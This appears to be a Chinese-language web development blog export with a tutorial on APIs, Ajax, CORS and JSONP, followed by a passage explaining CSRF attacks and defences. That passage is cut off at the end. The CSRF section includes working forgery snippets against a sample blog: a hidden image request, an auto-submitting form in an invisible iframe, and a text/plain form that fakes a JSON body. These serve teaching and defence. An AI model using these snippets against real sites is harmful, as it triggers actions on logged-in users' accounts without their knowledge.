介面是什麼？介面就是拿來串接用的，我舉一個例子你就知道了。 電腦上不是有一個 USB 插槽嗎？然後你只要是看到市面上有賣 USB 隨身碟的，都可以買來以後插到 USB 插槽，你的電腦就可以讀取得到。你有想過為什麼嗎？明明就是不同廠商做的東西，可是卻都可以讀得到、都可以插到 USB 插槽裡面。 因為有一項標準叫做 USB 介面，當這套標準訂出來以後，所有廠商只要按照這一套標準來開發，就可以保證能夠連接電腦跟 USB 隨身碟。 API 也是這樣，只是變成程式跟程式之間的串接。例如說今天我寫程式需要讀取檔案好了，我要怎麼讀取檔案？讀取檔案是作業系統提供的功能，因此我可以去串接「讀取檔案的 API」，就可以在我的程式裡面也使用這個功能了。 再多舉幾個例子你可能會更有感覺。 例如說今天我想要讓我的網頁能夠用 Facebook 登入，那要怎麼辦？我就要去串接「Facebook 提供的 API」，就等於說是 Facebook 向外提供給大家的一套介面、一套標準，任何想要接入 Facebook 服務的開發者們，都可以遵循著那套規範拿到自己想要的資料，這個東西就叫做 API。 或是你可能今天是一個飯店管理系統的開發者，你們公司做了一套給飯店用的 ERP，可以管理飯店的訂房狀態等等，就能知道說現在有哪些房間是空的。 而這些資料如果只有自己用太可惜了，於是公司決定把這些資料提供給大型訂房網站，在那些網站上能夠即時顯示這間飯店的房間狀況。所以就必須交換資料，你要提供一個「查詢房間情形的 API」給其他網站，讓他們能夠去串接，才能獲得這些資訊。 講到這邊，大家應該對 API 已經有一些 sense 了，我再多舉幾個例子： 我想要抓到 flickr 上面的照片，所以我要去串接 flickr 的 API Google 要開放讓其他 App 也能用 Google 登入驗證，所以 Google 要提供「Google 登入 API」 我要抓 Twitch 上面現在有哪些頻道，所以要串 Twitch API API Documentation 既然已經知道 API 是什麼了，也知道要串接 API，那下一個問題就是「那要怎麼串呢？」 剛剛前面有提過檔案存取的例子，其實這個比較像是呼叫作業系統或是程式語言的函式庫提供的 Function，而這些 Function 你通常都可以在官方文件上查到更詳細的說明，例如說 Node.js 的讀取檔案： （來源：https://nodejs.org/api/fs.html#fs_fs_readdir_path_options_callback） 上面就有寫說你應該呼叫哪一個 Function，應該傳入哪些參數。 API 的串接也是一樣，一定要有文件你才知道怎麼串，不然根本串不起來，因為你連要傳什麼參數都不知道。 我們可以先來看看Twitch API 文件是怎麼寫的。 裡面說明了你必須要有一個Client ID，然後 API Root 的 URL 是 https://api.twitch.tv/kraken 等等，這些都是與 API 相關的基本資訊。如果你在左側欄隨便點一個 API，會看到個別 API 的詳細資訊： 這邊就有寫說網址是什麼，你應該傳的參數是什麼等等，下面還有附上參考範例，這就是一個很完整的 API 文件。 通常在寫網頁的時候，我們都會直接講 API，但其實我們指的是 Web API，也就是透過網路來傳輸的 API。那有沒有非 Web API 呢？有，像我們前面提到的跟作業系統要讀檔的 API，就都是在本機底下執行的，沒有透過任何網路。 不過這其實也不用太在意，反正大家都習慣講 API，聽得懂就好。 現在有了 API 文件，我們就有了所有我們需要的資訊。以上面這個 Twitch 的例子來講，我們只要能夠發送 Request 到https://api.twitch.tv/kraken/games/top?client_id=xxx，Twitch 就會傳回目前最熱門的遊戲列表。 我們已經把問題的範圍一步步給縮小了，一開始是「要怎麼跟 Twitch 拿資料」，現在則更細的切分為：「要怎麼利用 JavaScript 發送 Reuqest」 Ajax 要在瀏覽器上面發送 Request，必須應用到一種技術叫做 Ajax，全名是「Asynchronous JavaScript and XML」，重點在於Asynchronous這個單字，非同步。 在講什麼是非同步之前，就要先來提一下什麼是同步。你原本寫的 JavaScript 就幾乎都是同步執行的。意思是他執行到某一行的時候，會等這行執行完畢，才執行到下一行，確保執行順序。 也就是說下面這段程式碼，最後一行需要等很長一段時間才能執行到： 1234567var count = 10000000;while(count--) &#123; // 做一些耗時的操作&#125; // 等很久才被執行到console.log('done') 看起來滿有道理的，程式本來不就是一行一行執行的嗎？可是如果今天牽涉到網路操作的話，大家可以思考看看下面這個例子： 12345// 假設有個發送 Request 的函式叫做 sendRequestvar result = sendRequest('https://api.twitch.tv/kraken/games/top?client_id=xxx'); // 等很久才被執行到console.log(result); 當 JavaScript 執行到sendRequest的時候，由於是同步的，就會等待 Response 回來才繼續做事。換句話說，在 Response 還沒回來之前，整個 JavaScript 引擎是不會執行任何東西的！很可怕對吧，你點任何有牽涉到 JavaScript 的東西，都不會有反應，因為 JavaScript 還在等 Response 回來。 所以呢，像是這種已經預期到可能非常耗時間，非常不穩定的操作，就不能用同步的方式來執行，而是要用非同步。 非同步是什麼意思呢？就是執行完之後就不管它了，不等結果回來就繼續執行下一行： 123456// 假設有個發送 Request 的函式叫做 sendRequestvar result = sendRequest('https://api.twitch.tv/kraken/games/top?client_id=xxx'); // 上面 Request 發送完之後就執行到這一行，所以 result 不會有東西// 因為 Response 根本沒有回來console.log(result); 這邊需要特別注意的是「非同步的 Function 不能直接透過 return 把結果傳回來」，為什麼？因為像上面這個例子，它發送 Request 之後就會執行到下一行了，這個時候根本就還沒有 Response，是要回傳什麼？ 那怎麼辦呢？先聽我舉個很常見的小例子吧！ 我之前在新加坡的 Food Court 吃飯的時候，那邊每一張桌子上面都會有桌號。你去點餐的時候，只要跟老闆講說你坐哪一桌，等餐點完成之後老闆就會自己主動送過來。 所以我不需要站在店家門口等，我只要在位子上繼續坐我的事情，反正餐點好了之後老闆會送過來。 非同步的概念也是這樣，我發送 Request 之後（我點餐之後），我不用等 Response 回來（不用等老闆做好），可以繼續做自己的事，等 Response 回來之後（等餐點做好之後），會自己幫我把結果送過來（老闆會自己送過來）。 在點餐的例子中，老闆可以透過桌號知道應該把資料送到哪邊，那在 JavaScript 裡面呢？可以透過 Function！而這個 Function，我們就稱作 Callback Function，回呼函式。 當非同步的操作完成時，就可以呼叫這個 Function，並且把資料帶進來。 1234567891011// 假設有個發送 Request 的函式叫做 sendRequestsendRequest('https://api.twitch.tv/kraken/games/top?client_id=xxx', callMe); function callMe (response) &#123; console.log(response);&#125; // 或者寫成匿名函式sendRequest('https://api.twitch.tv/kraken/games/top?client_id=xxx', function (response) &#123; console.log(response);&#125;); 現在你就知道為什麼網路的操作是非同步，以及什麼是 callback function 了。 XMLHttpRequest 方才提到 Ajax、非同步以及 callback function 的概念，但還是沒講到要怎麼發送 Request，只寫了一個假的sendRequest函式當作參考而已。 要發送 Request 的話，就要透過瀏覽器幫我們準備好的一個物件，叫做XMLHttpRequest，範例程式碼如下： 12345678910var request = new XMLHttpRequest();request.open('GET', `https://api.twitch.tv/kraken/games/top?client_id=xxx`, true);request.onload = function() &#123; if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) &#123; // Success! console.log(request.responseText); &#125;&#125;;request.send(); 上面的request.onload其實就是在指定說當資料回來的時候，要用哪一個 function 去處理。 有了上面這一段程式碼之後，你終於大功告成，終於可以串接 Twitch API，從那邊拿資料下來了！真是可喜可賀，從此之後，你就跟「串接 API」這個技能過著幸福快樂的生活… 才怪。 Same Origin Policy 正當你以為自己已經對串接 API 駕輕就熟，想說去串接別的 API 試試看好了的時候，才發現一串就出問題了： 1234XMLHttpRequest cannot load http://odata.tn.edu.tw/ebookapi/api/getOdataJH/?level=all. No &apos;Access-Control-Allow-Origin&apos; header is present on the requested resource. Origin &apos;null&apos; is therefore not allowed access. 咦？為什麼會有這個錯誤呢？ 其實是瀏覽器因為安全性的考量，有一個東西叫做同源政策，Same-origin policy。 意思就是說如果你現在這個網站的跟你要呼叫的 API 的網站「不同源」的時候，瀏覽器一樣會幫你發 Request，但是會把 Response 給擋下來，不讓你的 JavaScript 拿到並且傳回錯誤。 什麼是不同源呢？其實你想簡單一點，只要是 Domain 不一樣就是不同源，或者是一個用http一個用https也是不同源，端口號不一樣也是不同源。 所以如果你是接別人 API 的話，大多數情形都是不同源的。 這邊我想再強調一點，「你的 Request 還是有發出去的」，而且瀏覽器也「確實有收到 Response」，重點是「瀏覽器因為同源政策，不把結果傳回給你的 JavaScript」。如果沒有瀏覽器的話其實就沒有這些問題，你愛發給誰就發給誰，不管怎樣都拿得到 Response。 好，既然剛剛說了不同源會被擋下來，那 Twitch API 不是也不同源嗎，是怎麼串接成功的？ CORS 大家都知道其實在不同源之間互相傳輸資料是很常有的事情，像我們串接 Twitch API 就是，我們怎麼可能跟 Twitch API 在同一個 Domain 底下呢？ 因此，同源政策的確是規範非同源就被擋下來，但與此同時其實又有另外一個規範，是說：「如果你想在不同 origin 之間傳輸資料的話，你應該怎麼做」，這規範就叫做 CORS。 CORS，全名為 Cross-Origin HTTP request，跨來源 HTTP 請求。 這套規範跟你說，如果你想開啟跨來源 HTTP 請求的話，Server 必須在 Response 的 Header 裡面加上Access-Control-Allow-Origin。 這個字段你應該不陌生才對，覺得陌生的可以拉回去上面看，剛剛的錯誤訊息其實就有講到這一個 Header。 當瀏覽器收到 Response 之後，會先檢查Access-Control-Allow-Origin裡面的內容，如果裡面有包含現在這個發起 Request 的 Origin 的話，就會允許通過，讓程式順利接收到 Response。 如果你打開 Devtool 仔細看一開始我們發給 Twitch 的 Request，你會發現 Response 的 Header 大概是長這樣： 1234567891011Content-Type: application/jsonContent-Length: 71Connection: keep-aliveServer: nginxAccess-Control-Allow-Origin: *Cache-Control: no-cache, no-store, must-revalidate, privateExpires: 0Pragma: no-cacheTwitch-Trace-Id: e316ddcf2fa38a659fa95af9012c9358X-Ctxlog-Logid: 1-5920052c-446a91950e3abed21a360bd5Timing-Allow-Origin: https://www.twitch.tv 重點是這一行：Access-Control-Allow-Origin: *，星號就代表萬用字元，意思是任何一個 Origin 都接受。所以當瀏覽器接收到這個 Response 之後，比對目前的 Origin 符合*這個規則，檢驗通過，允許我們接受跨來源請求的回應。 除了這個 Header 以外，其實還有其他的可以用，例如說Access-Control-Allow-Headers跟Access-Control-Allow-Methods，就可以定義接受哪些 Request Header 以及接受哪些 Method。 總結一下，如果你想要發起跨來源 HTTP 請求並且順利收到回應的話，需要確保 Server 端有加上Access-Control-Allow-Origin，不然 Response 會被瀏覽器給擋下來並且顯示出錯誤訊息。 Preflight Request 還記得 Twitch 的 API 文件嗎？裡面需要帶一個client-id的參數，而文件裡面寫說你可以帶在 GET 的參數上面，也可以帶在 Header 裡，我們來試試看帶在 Header 裡會怎樣吧！打開 Devtool，你會看到一個神奇的現象： 咦？我明明只發了一個 Request，怎麼變兩個了？而且第一個的 Method 居然是OPTIONS。只是多加了一個 Header 就多了一個 Request，是為什麼呢？ 其實這又跟上面講的 CORS 有關了，CORS 把 Request 分成兩種，一種是簡單請求（simple requests）。什麼是簡單請求呢？其實定義有滿長一串的，我認為有需要用到的時候再看就好，但總之如果你沒有加任何自定義的 Header，而且又是 GET 的話，絕對是簡單請求（這個夠簡單了吧） 反之呢，如果你有加一些自定義的 Header，例如說我們剛剛加的Client-ID，這個 Request 就絕對不是簡單請求。 （定義可參考：MDN: 簡單請求） 從上述分類可知，我們剛剛發起的 Request 因為有帶了 Custom header，所以不會是簡單請求，那為什麼會多一個 Request 呢？ 這一個 Request 叫做 Preflight Request，中文翻作「預檢請求」，因為非簡單請求可能會帶有一些使用者資料，因此會先透過 Preflight Request 去確認後續的請求能否送出。 如果這個 Preflight Request 沒有過的話，真的 Request 也就不會發送了，這就是預檢請求的目的。 我舉一個例子，你就會知道為什麼需要這個 Preflight Request 了。 假設今天某個 Server 提供了一個 API 網址叫做：https://example.com/data/16，你只要對它發送 GET，就能夠拿到 id 是 16 的資料，只要對它發送 DELETE，就可以把這筆資料刪除。 如果今天沒有 Preflight Request 這個機制的話，我就可以在隨便一個 Domain 的網頁上面發送一個 DELETE 的 Request 給這個 API。剛剛我有強調說瀏覽器的 CORS 機制，還是會幫你發送 Request，但只是 Response 被瀏覽器擋住而已。 因此呢，儘管沒有 Response，但是 Server 端的確收到了這個 Request，因此就會把這筆資料給刪除。 如果有 Preflight Request 的話，在發送出去收到結果的時候，就會知道這個 API 並沒有提供 CORS，因此真的 DELETE 請求就不會送出，到這邊就結束了。 先用一個 OPTIONS 的請求去確認之後的 Request 能不能送出，這就是 Preflight Request 的目的。 JSONP 最後來講一下 JSONP，這是跨來源請求除了 CORS 以外的另外一種方法，全名叫做：JSON with Padding。 還記得一開始提到的同源政策吧？仔細思考一下會發現，其實有些東西是不受同源政策限制的，例如說&lt;script&gt;這個 Tag，我們不是常常引用 CDN 或是 Google Analytics 之類的第三方套件嗎？網址都是其他 Domain 的，但是卻能正常載入。 JSONP 就是利用&lt;script&gt;的這個特性來達成跨來源請求的。 今天先想像你有一段 HTML 長這樣： 12345678&lt;script&gt; var response = &#123; data: 'test' &#125;;&lt;/script&gt;&lt;script&gt; console.log(response);&lt;/script&gt; 很好懂的一段程式碼，我就不多做解釋了。那如果今天把上面那一段換成一串網址呢？ 1234&lt;script src=\"https://another-origin.com/api/games\"&gt;&lt;/script&gt;&lt;script&gt; console.log(response);&lt;/script&gt; 如果https://another-origin.com/api/games這個網址返回的內容就是剛剛的： 123var response = &#123; data: 'test'&#125;; 那我不就一樣可以拿到資料了嗎？而且這些資料還是 Server 端控制的，所以 Server 可以給我任何資料。但是這樣用全域變數其實不太好，我們可以借用剛剛的 Callback Function 的概念，改成這樣： 12345678910&lt;script&gt; receiveData(&#123; data: 'test' &#125;);&lt;/script&gt;&lt;script&gt; function receiveData (response) &#123; console.log(response); &#125;&lt;/script&gt; 所以 JSONP 是什麼？JSONP 其實就是透過上面這種形式，利用&lt;script&gt;裡面放資料，透過指定好的 function 把資料給帶回去。你只要把第一段的&lt;script&gt;那邊想成是 Server 的回傳值，你就可以理解了。 實務上在操作 JSONP 的時候，Server 通常會提供一個callback的參數讓 client 端帶過去。Twitch API 有提供 JSONP 的版本，我們可以直接來看範例： URL: https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=aaa&amp;limit=1 1aaa(&#123;\"_total\":1069,\"_links\":&#123;\"self\":\"https://api.twitch.tv/kraken/games/top?limit=1\",\"next\":\"https://api.twitch.tv/kraken/games/top?limit=1\\u0026offset=1\"&#125;,\"top\":[&#123;\"game\":&#123;\"name\":\"Dota 2\",\"popularity\":63361,\"_id\":29595,\"giantbomb_id\":32887,\"box\":&#123;\"large\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-272x380.jpg\",\"medium\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-136x190.jpg\",\"small\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-52x72.jpg\",\"template\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg\"&#125;,\"logo\":&#123;\"large\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-240x144.jpg\",\"medium\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-120x72.jpg\",\"small\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-60x36.jpg\",\"template\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg\"&#125;,\"_links\":&#123;&#125;,\"localized_name\":\"Dota 2\",\"locale\":\"zh-tw\"&#125;,\"viewers\":65243,\"channels\":373&#125;]&#125;) URL: https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=receiveData&amp;limit=1 1receiveData(&#123;\"_total\":1067,\"_links\":&#123;\"self\":\"https://api.twitch.tv/kraken/games/top?limit=1\",\"next\":\"https://api.twitch.tv/kraken/games/top?limit=1\\u0026offset=1\"&#125;,\"top\":[&#123;\"game\":&#123;\"name\":\"Dota 2\",\"popularity\":63361,\"_id\":29595,\"giantbomb_id\":32887,\"box\":&#123;\"large\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-272x380.jpg\",\"medium\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-136x190.jpg\",\"small\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-52x72.jpg\",\"template\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg\"&#125;,\"logo\":&#123;\"large\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-240x144.jpg\",\"medium\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-120x72.jpg\",\"small\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-60x36.jpg\",\"template\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg\"&#125;,\"_links\":&#123;&#125;,\"localized_name\":\"Dota 2\",\"locale\":\"zh-tw\"&#125;,\"viewers\":65622,\"channels\":376&#125;]&#125;) 有發現了嗎？它就是透過你帶過去的callback這個參數當作函式名稱，把 JavaScript 物件整個傳到 Function 裡面，你就可以在 Function 裡面拿到資料。 結合起來會變這樣： 123456&lt;script src=\"https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=receiveData&amp;limit=1\"&gt;&lt;/script&gt;&lt;script&gt; function receiveData (response) &#123; console.log(response); &#125;&lt;/script&gt; 利用 JSONP，也可以存取跨來源的資料。但 JSONP 的缺點就是你要帶的那些參數永遠都只能用附加在網址上的方式（GET）帶過去，沒辦法用 POST。 如果能用 CORS 的話，還是應該優先考慮 CORS。 總結 今天這篇文章的內容就是從抓資料這件事情開始，一步步告訴你應該去哪裡抓？應該怎麼抓？用 API 抓，那什麼是 API？怎麼在 JavaScript 裡面呼叫 Web API？怎麼樣存取跨來源的資料？ 一般來說，跟前端抓資料有關的東西我基本上都提到了，不過有個遺珠之憾是沒有提到Fetch API，這是比較新的標準，也是拿來抓資料用的，MDN 上面的介紹是： The Fetch API provides an interface for fetching resources (including across the network). It will seem familiar to anyone who has used XMLHttpRequest, but the new API provides a more powerful and flexible feature set. 有興趣的讀者們可以自己去看一下。 希望大家看完這篇之後，會更了解怎麼樣串接後端 API，以及串接的時候可能會碰到哪些困難。","link":"/2017/08/27/ajax-and-cors/"},{"title":"讓我們來談談 CSRF","text":"前言 最近剛好碰到一些 CSRF 的案例，趁著這次機會好好研究了一下。深入研究之後才發現這個攻擊其實滿可怕的，因為很容易忽略它。但幸好現在有些 Framework 都有內建防禦 CSRF 的功能，可以很簡單的開啟。 但儘管如此，我認為還是有必要瞭解一下 CSRF 到底在幹嘛，是透過怎樣的手段攻擊，以及該如何防禦。就讓我們先來簡單的介紹一下它吧！ CSRF 是一種 Web 上的攻擊手法，全稱是 Cross Site Request Forgery，跨站請求偽造。不要跟 XSS 搞混了，他們兩種是不同的東西，那到底什麼是 CSRF 呢？先從我自身的一個案例談起好了。 偷懶的刪除功能 以前我有做個一個簡單的後台頁面，就想成是一個部落格吧！可以發表、刪除以及編輯文章，介面大概長得像這樣： 可以看到刪除的那個按鈕，點下去之後就可以把一篇文章刪掉。當初因為偷懶，想說如果我把這個功能做成 GET，我就可以直接用一個連結完成刪除這件事，在前端幾乎不用寫到任何程式碼： 1&lt;a href='/delete?id=3'&gt;刪除&lt;/a&gt; 很方便對吧？然後我在網頁後端那邊做一下驗證，驗證 request 有沒有帶 session id 上來，也驗證這篇文章是不是這個 id 的作者寫的，都符合的話才刪除文章。 嗯，聽起來該做的都做了啊，我都已經做到：「只有作者本人可以刪除自己的文章」了，應該很安全了，難道還有哪裡漏掉了嗎？ 沒錯，的確是「只有作者本人可以刪除自己的文章」，但如果他不是自己「主動刪除」，而是在不知情的情況下刪除呢？你可能會覺得我在講什麼東西，怎麼會有這種事情發生，不是作者主動刪的還能怎麼刪？ 好，我就來讓你看看還能怎麼刪！ 今天假設小黑是一個邪惡的壞蛋，想要讓小明在不知情的情況下就把自己的文章刪掉，該怎麼做呢？ 他知道小明很喜歡心理測驗，於是就做了一個心理測驗網站，並且發給小明。但這個心理測驗網站跟其他網站不同的點在於，「開始測驗」的按鈕長得像這樣： 1&lt;a href='https://small-min.blog.com/delete?id=3'&gt;開始測驗&lt;/a&gt; 小明收到網頁之後很開心，就點擊「開始測驗」。點擊之後瀏覽器就會發送一個 GET 請求給https://small-min.blog.com/delete?id=3，並且因為瀏覽器的運行機制，一併把 small-min.blog.com 的 cookie 都一起帶上去。 Server 端收到之後檢查了一下 session，發現是小明，而且這篇文章也真的是小明發的，於是就把這篇文章給刪除了。 這就是 CSRF，你現在明明在心理測驗網站，假設是 https://test.com 好了，但是卻在不知情的狀況下刪除了 https://small-min.blog.com 的文章，你說這可不可怕？超可怕！ 這也是為什麼 CSRF 又稱作 one-click attack 的緣故，你只要點一下就中招了。 你可能會說：「可是這樣小明不就知道了嗎，不就連過去部落格了？不符合『不知情的狀況』啊！」 好，那如果我們改成這樣呢： 12&lt;img src='https://small-min.blog.com/delete?id=3' width='0' height='0' /&gt;&lt;a href='/test'&gt;開始測驗&lt;/a&gt; 在開啟頁面的同時，一樣發送一個刪除的 request 出去，但這次小明是真的完全不知道這件事情。這樣就符合了吧！ CSRF 就是在不同的 domain 底下卻能夠偽造出「使用者本人發出的 request」。要達成這件事也很簡單，因為瀏覽器的機制，你只要發送 request 給某個網域，就會把關聯的 cookie 一起帶上去。如果使用者是登入狀態，那這個 request 就理所當然包含了他的資訊（例如說 session id），這 request 看起來就像是使用者本人發出的。 那我把刪除改成 POST 不就好了嗎？ 沒錯，聰明！我們不要那麼懶，好好把刪除的功能做成 POST，這樣不就無法透過 &lt;a&gt; 或是 &lt;img&gt; 來攻擊了嗎？除非有哪個 HTML 元素可以發送 POST request！ 有，正好有一個，就叫做 form。 1234&lt;form action=\"https://small-min.blog.com/delete\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"id\" value=\"3\"/&gt; &lt;input type=\"submit\" value=\"開始測驗\"/&gt;&lt;/form&gt; 小明點下去以後，照樣中招，一樣刪除了文章。你可能又會疑惑說，但是這樣小明不就知道了嗎？我跟你一樣很疑惑，於是我 Google 到了這篇：Example of silently submitting a POST FORM (CSRF) 這篇提供的範例如下，網頁的世界真是博大精深： 123456&lt;iframe style=\"display:none\" name=\"csrf-frame\"&gt;&lt;/iframe&gt;&lt;form method='POST' action='https://small-min.blog.com/delete' target=\"csrf-frame\" id=\"csrf-form\"&gt; &lt;input type='hidden' name='id' value='3'&gt; &lt;input type='submit' value='submit'&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(\"csrf-form\").submit()&lt;/script&gt; 開一個看不見的 iframe，讓 form submit 之後的結果出現在 iframe 裡面，而且這個 form 還可以自動 submit，完全不需要經過小明的任何操作。 到了這步，你就知道改成 POST 是沒用的。 那我後端改成只接收 json 呢？ 聰明的你靈機一動：「既然在前端只有 form 可以送出 POST 的話，那我的 api 改成用 json 收資料不就可以了嗎？這樣總不能用 form 了吧！」 spring 的 document告訴你：這還是沒用的！ 12345&lt;form action=\"https://small-min.blog.com/delete\" method=\"post\" enctype=\"text/plain\"&gt;&lt;input name='&#123;\"id\":3, \"ignore_me\":\"' value='test\"&#125;' type='hidden'&gt;&lt;input type=\"submit\" value=\"delete!\"/&gt;&lt;/form&gt; 這樣子會產生如下的 request body： 123&#123; \"id\": 3,\"ignore_me\": \"=test\"&#125; 但這邊值得注意的一點是，form能夠帶的 content type 只有三種：application/x-www-form-urlencoded, multipart/form-data 跟 text/plain。在上面的攻擊中我們用的是最後一種，text/plain，如果你在你的後端 Server 有檢查這個 content type 的話，是可以避免掉上面這個攻擊的。 只是，上面這幾個攻擊我們都還沒講到一種情況：如果你的 api 接受 cross origin 的 request 呢？ 意思就是，如果你的 api 的 Access-Control-Allow-Origin 設成 * 的話，代表任何 domain 都可以發送 ajax 到你的 api server，這樣無論你是改成 json，或甚至把 method 改成 PUT, DELETE 都沒有用。 我們舉的例子是刪除文章，這你可能覺得沒什麼，那如果是銀行轉帳呢？攻擊者只要在自己的網頁上寫下轉帳給自己帳號的 code，再把這個網頁散佈出去就好，就可以收到一大堆錢。 講了這麼多，來講該怎麼防禦吧！先從最簡單的「使用者」開始講。 使用者的防禦 CSRF 攻擊之所以能成立，是因為使用者在被攻擊的網頁是處於已經登入的狀態，所以才能做出一些行為。雖然說這些攻擊應該由網頁那邊負責處理，但如果你真的很怕，怕網頁會處理不好的話，你可以在每次使用完網站就登出，就可以避免掉 CSRF。 或者呢，關閉執行 js 或把上面這些 pattern 的程式碼過濾掉不要執行，也是一個方法（但應該很難判定哪些是 CSRF 攻擊的程式碼）。 所以使用者能做的其實有限，真的該做事的是 Server 那邊！ Server 的防禦 CSRF 之所以可怕是因為 CS 兩個字：Cross Site，你可以在任何一個網址底下發動攻擊。CSRF 的防禦就可以從這個方向思考，簡單來說就是：「我要怎麼擋掉從別的 domain 來的 request」 你仔細想想，CSRF 的 reuqest 跟使用者本人發出的 request 有什麼區別？區別在於 domain 的不同，前者是從任意一個 domain 發出的，後者是從同一個 domain 發出的（這邊假設你的 api 跟你的前端網站在同一個 domain） 檢查 Referer request 的 header 裡面會帶一個欄位叫做 referer，代表這個 request 是從哪個地方過來的，可以檢查這個欄位看是不是合法的 domain，不是的話直接 reject 掉即可。 但這個方法要注意的地方有三個，第一個是有些瀏覽器可能不會帶 referer，第二個是有些使用者可能會關閉自動帶 referer 的這個功能，這時候你的 server 就會 reject 掉由真的使用者發出的 request。 第三個是你判定是不是合法 domain 的程式碼必須要保證沒有 bug，例如： 1234const referer = request.headers.referer;if (referer.indexOf('small-min.blog.com') &gt; -1) &#123; // pass&#125; 你看出上面這段的問題了嗎？如果攻擊者的網頁是small-min.blog.com.attack.com的話，你的檢查就破功了。 所以，檢查 referer 並不是一個很完善的解法 加上圖形驗證碼、簡訊驗證碼等等 就跟網路銀行轉帳的時候一樣，都會要你收簡訊驗證碼，多了這一道檢查就可以確保不會被 CSRF 攻擊。 圖形驗證碼也是，攻擊者並不知道圖形驗證碼的答案是什麼，所以就不可能攻擊了。 這是一個很完善的解決方法，但如果使用者每次刪除 blog 都要打一次圖形驗證碼，他們應該會煩死吧！ 加上 CSRF token 要防止 CSRF 攻擊，我們其實只要確保有些資訊「只有使用者知道」即可。那該怎麼做呢？ 我們在 form 裡面加上一個 hidden 的欄位，叫做csrftoken，這裡面填的值由 server 隨機產生，並且存在 server 的 session 中。 12345&lt;form action=\"https://small-min.blog.com/delete\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"id\" value=\"3\"/&gt; &lt;input type=\"hidden\" name=\"csrftoken\" value=\"fj1iro2jro12ijoi1\"/&gt; &lt;input type=\"submit\" value=\"刪除文章\"/&gt;&lt;/form&gt; 按下 submit 之後，server 比對表單中的csrftoken與自己 session 裡面存的是不是一樣的，是的話就代表這的確是由使用者本人發出的 request。這個 csrftoken 由 server 產生，並且每一段不同的 session 就應該要更換一次。 那這個為什麼可以防禦呢？因為攻擊者並不知道 csrftoken 的值是什麼，也猜不出來，所以自然就無法進行攻擊了。 可是有另外一種狀況，假設你的 server 支持 cross origin 的 request，會發生什麼事呢？攻擊者就可以在他的頁面發起一個 request，順利拿到這個 csrf token 並且進行攻擊。不過前提是你的 server 接受這個 domain 的 request。 接著讓我們來看看另外一種解法 Double Submit Cookie 上一種解法需要 server 的 state，亦即 csrf token 必須被保存在 server 當中，才能驗證正確性。而現在這個解法的好處就是完全不需要 server 儲存東西。 這個解法的前半段與剛剛的相似，由 server 產生一組隨機的 token 並且加在 form 上面。但不同的點在於，除了不用把這個值寫在 session 以外，同時也讓 client side 設定一個名叫 csrftoken 的 cookie，值也是同一組 token。 1234567Set-Cookie: csrftoken=fj1iro2jro12ijoi1&lt;form action=\"https://small-min.blog.com/delete\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"id\" value=\"3\"/&gt; &lt;input type=\"hidden\" name=\"csrftoken\" value=\"fj1iro2jro12ijoi1\"/&gt; &lt;input type=\"submit\" value=\"刪除文章\"/&gt;&lt;/form&gt; 你可以仔細思考一下 CSRF 攻擊的 request 與使用者本人發出的 request 有什麼不一樣？不一樣的點就在於，前者來自不同的 domain，後者來自相同的 domain。所以我們只要有辦法區分出這個 request 是不是從同樣的 domain 來，我們就勝利了。 而 Double Submit Cookie 這個解法正是從這個想法出發。 當使用者按下 submit 的時候，server 比對 cookie 內的 csrftoken 與 form 裡面的 csrftoken，檢查是否有值並且相等，就知道是不是使用者發的了。 為什麼呢？假設現在攻擊者想要攻擊，他可以隨便在 form 裡面寫一個 csrf token，這當然沒問題，可是因為瀏覽器的限制，他並不能在他的 domain 設定 small-min.blog.com 的 cookie 啊！所以他發上來的 request 的 cookie 裡面就沒有 csrftoken，就會被擋下來。 當然，這個方法看似好用，但也是有缺點的，可以參考：Double Submit Cookies vulnerabilities，攻擊者如果掌握了你底下任何一個 subdomain，就可以幫你來寫 cookie，並且順利攻擊了。 client side 的 Double Submit Cookie 會特別提到 client side，是因為我之前所碰到的專案是 Single Page Application，上網搜尋一下就會發現有人在問：「SPA 該如何拿到 CSRF token？」，難道要 server 再提供一個 api 嗎？這樣好像有點怪怪的。 但是呢，我認為我們可以利用 Double Submit Cookie 的精神來解決這個問題。而解決這問題的關鍵就在於：由 client side 來生 csrf token。就不用跟 server api 有任何的互動。 其他的流程都跟之前一樣，生成之後放到 form 裡面以及寫到 cookie。或者說如果你是 SPA 的話，也可以把這資訊直接放到 request header，你就不用在每一個表單都做這件事情，只要統一加一個地方就好。 事實上，我自己常用的 library axios 就有提供這樣的功能，你可以設置 header 名稱跟 cookie 名稱，設定好以後你每一個 request，它都會自動幫你把 header 填上 cookie 裡面的值。 12345 // `xsrfCookieName` is the name of the cookie to use as a value for xsrf tokenxsrfCookieName: &apos;XSRF-TOKEN&apos;, // default// `xsrfHeaderName` is the name of the http header that carries the xsrf token valuexsrfHeaderName: &apos;X-XSRF-TOKEN&apos;, // default 那為什麼由 client 來生這個 token 也可以呢？因為這個 token 本身的目的其實不包含任何資訊，只是為了「不讓攻擊者」猜出而已，所以由 client 還是由 server 來生成都是一樣的，只要確保不被猜出來即可。Double Submit Cookie 